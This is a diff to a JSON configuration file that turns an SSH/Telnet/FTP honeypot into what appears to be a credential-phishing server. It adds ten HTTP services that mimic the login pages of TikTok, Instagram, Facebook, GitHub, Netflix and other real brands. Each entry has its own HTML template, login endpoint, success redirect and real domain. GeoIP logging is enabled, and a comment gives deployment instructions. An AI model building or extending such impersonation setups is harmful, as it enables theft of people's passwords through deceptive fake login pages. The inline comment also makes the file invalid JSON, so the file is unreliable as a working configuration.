@@ -1,8 +1,105 @@
 {
   "services": [
-    {"name": "SSH", "port": 2222, "banner": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3\r\n", "type": "tcp"},
-    {"name": "Telnet", "port": 2323, "banner": "Ubuntu 20.04 LTS\r\nlogin: ", "type": "tcp"},
-    {"name": "FTP", "port": 2121, "banner": "220 (vsFTPd 3.0.5)\r\n", "type": "tcp"}
+    {
+      "name": "TikTok",
+      "port": 8080,
+      "banner": null,
+      "type": "http",
+      "template": "tiktok.html",
+      "login_endpoint": "/login",
+      "success_redirect": "/?success=1",
+      "domain": "tiktok.com"
+    },
+    {
+      "name": "Instagram",
+      "port": 8081,
+      "banner": null,
+      "type": "http",
+      "template": "instagram.html",
+      "login_endpoint": "/login",
+      "success_redirect": "/?success=1",
+      "domain": "instagram.com"
+    },
+    {
+      "name": "Facebook",
+      "port": 8082,
+      "banner": null,
+      "type": "http",
+      "template": "facebook.html",
+      "login_endpoint": "/login",
+      "success_redirect": "/?success=1",
+      "domain": "facebook.com"
+    },
+    {
+      "name": "Snapchat",
+      "port": 8083,
+      "banner": null,
+      "type": "http",
+      "template": "snapchat.html",
+      "login_endpoint": "/login",
+      "success_redirect": "/?success=1",
+      "domain": "snapchat.com"
+    },
+    {
+      "name": "Twitter",
+      "port": 8084,
+      "banner": null,
+      "type": "http",
+      "template": "twitter.html",
+      "login_endpoint": "/login",
+      "success_redirect": "/?success=1",
+      "domain": "twitter.com"
+    },
+    {
+      "name": "LinkedIn",
+      "port": 8085,
+      "banner": null,
+      "type": "http",
+      "template": "linkedin.html",
+      "login_endpoint": "/login",
+      "success_redirect": "/?success=1",
+      "domain": "linkedin.com"
+    },
+    {
+      "name": "GitHub",
+      "port": 8086,
+      "banner": null,
+      "type": "http",
+      "template": "github.html",
+      "login_endpoint": "/login",
+      "success_redirect": "/?success=1",
+      "domain": "github.com"
+    },
+    {
+      "name": "Spotify",
+      "port": 8087,
+      "banner": null,
+      "type": "http",
+      "template": "spotify.html",
+      "login_endpoint": "/login",
+      "success_redirect": "/?success=1",
+      "domain": "spotify.com"
+    },
+    {
+      "name": "Netflix",
+      "port": 8088,
+      "banner": null,
+      "type": "http",
+      "template": "netflix.html",
+      "login_endpoint": "/login",
+      "success_redirect": "/?success=1",
+      "domain": "netflix.com"
+    },
+    {
+      "name": "Reddit",
+      "port": 8089,
+      "banner": null,
+      "type": "http",
+      "template": "reddit.html",
+      "login_endpoint": "/login",
+      "success_redirect": "/?success=1",
+      "domain": "reddit.com"
+    }
   ],
   "geoip": {
     "enabled": true,
@@ -25,5 +122,9 @@
   "logging": {
     "log_dir": "logs",
     "log_file": "events.jsonl"
+  },
+  "web": {
+    "base_url": "http://localhost",  # Change to your actual IP or domain when deploying
+    "port": 8080
   }
 }
